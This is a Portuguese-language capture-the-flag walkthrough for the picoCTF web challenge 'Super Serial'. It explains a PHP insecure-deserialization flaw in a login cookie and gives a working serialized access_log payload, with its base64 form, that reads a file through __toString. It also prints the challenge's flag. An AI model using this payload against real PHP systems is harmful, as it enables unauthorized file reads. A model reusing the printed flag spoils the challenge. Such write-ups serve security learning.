# Super Serial
Este é um desafio de exploração web, com foco em PHP, serialização e cookies.

> Dica: The flag is at `../flag`

##### [Link do desafio](https://play.picoctf.org/practice/challenge/180?page=1&search=super%20serial)

## Passo a passo

Ao iniciar o desafio, me deparo com uma página simples de login. Logo de início, testo credenciais comuns, como `username: admin` e `password: admin`

<img width="687" height="466" alt="image" src="https://github.com/user-attachments/assets/de78160c-eac3-41b1-b28d-254c671c71ff" />

O login não funcionou — o que já era esperado, pois o desafio seria muito simples se aceitasse credenciais padrão. Ainda assim, fui redirecionado para a página `index.php`

<img width="939" height="167" alt="image" src="https://github.com/user-attachments/assets/a335f331-3d65-4031-ac77-231c568c9eff" />

Em seguida, começo a testar possíveis rotas diretamente na URL, como `/admin` e `/dashboard`. Durante essa enumeração, encontro um arquivo interessante em `/robots.txt`

<img width="553" height="133" alt="image" src="https://github.com/user-attachments/assets/f511b87f-f1bd-4c88-83ee-59da51f1e005" />

O arquivo indica a existência de uma página não indexada pelo domínio. No entanto, ao tentar acessá-la diretamente pela URL, não sou redirecionado para lugar nenhum

<img width="594" height="211" alt="image" src="https://github.com/user-attachments/assets/361a3695-2243-4f55-81b4-508989d9d65b" />

No arquivo robots.txt, o nome termina com .phps.Isso indica uma forma de compartilhar código PHP.Nesse caso, o código não é executado, apenas exibido.

Dessa forma, testei o arquivo `.phps` na página `index.php`.O retorno foi o seguinte código: 
```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

Aqui começa o verdadeiro desafio.Esse trecho referencia dois outros arquivos: `authentication.php` e `cookie.php`

Página `authentication.phps`
```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
Página `cookie.phps`
```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
?>
```
Agora, o servidor utiliza o seguinte código para verificar se o usuário está autorizado a acessar a página. Para isso, é criado um objeto `permissions` com o nome de usuário e a senha fornecidos
```php
$perm_res = new permissions($username, $password);
```
Analisando o código, a função `is_admin()` só retorna verdadeiro caso o usuário exista no banco de dados e possua o campo admin igual a 1
```php
function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}
```
Após a validação, o servidor serializa o objeto e o armazena em um cookie no navegador do cliente
```php
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
```
Esse mesmo cookie é lido posteriormente e desserializado diretamente, sem qualquer validação adicional
```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
Esse comportamento é **extremamente perigoso**, pois o cookie é controlado pelo cliente. Isso permite que um atacante modifique o conteúdo serializado e altere seus privilégios de acesso

Sendo assim, é possível armazenar um objeto `access_log` serializado no cookie `login`, com o atributo `log_file` definido como `../flag`

Com isso, o servidor tentará executar a primeira e a segunda linha do bloco `try`. Porém, o objeto `access_log` não possui as funções `is_guest()` ou `is_admin()`. Isso gera uma exceção. O fluxo cai diretamente no bloco `catch`.
```php
catch(Error $e){
	die("Deserialization error. ".$perm);
}
```
Esse código imprime uma mensagem de erro e concatena o objeto `$perm` à string. Com isso, o método mágico `__toString()` da classe `access_log` é chamado:
```php
function __toString() {
	return $this->read_log();
}
```
Logo também chamando:
```php
function read_log() {
	return file_get_contents($this->log_file);
}
```
Como o atributo `log_file` pode ser controlado, ele é definido como `../flag`. Dessa forma, o conteúdo da *flag* é lido e exibido junto à mensagem de erro.

O objeto `access_log` serializado fica da seguinte forma: `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`. Essa técnica segue a documentação do [Portswigger](https://portswigger.net/web-security/deserialization/exploiting) sobre PHP Insecure Deserialization

Codifico isso em base64 pelo [Cyberchef](https://gchq.github.io/CyberChef/)

<img width="1294" height="555" alt="image" src="https://github.com/user-attachments/assets/921212b8-2bc5-467f-b290-d77297e38969" />

Retornando TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9

Esse valor é inserido manualmente no cookie login. Após acessar a página de autenticação, o servidor desserializa o objeto. A exceção é gerada e a *flag* é revelada

<img width="955" height="508" alt="image" src="https://github.com/user-attachments/assets/824a8c8d-3b94-419b-9608-16e14a605c48" />

## FLAG: picoCTF{1_c4nn0t_s33_y0u_2fba20fa}

## Conclusão:
Esse desafio é execelnte para desenvolver a interpretação de código PHP, além de expor o sério perigo de confiar o acesso de login nas mãos do usuário.
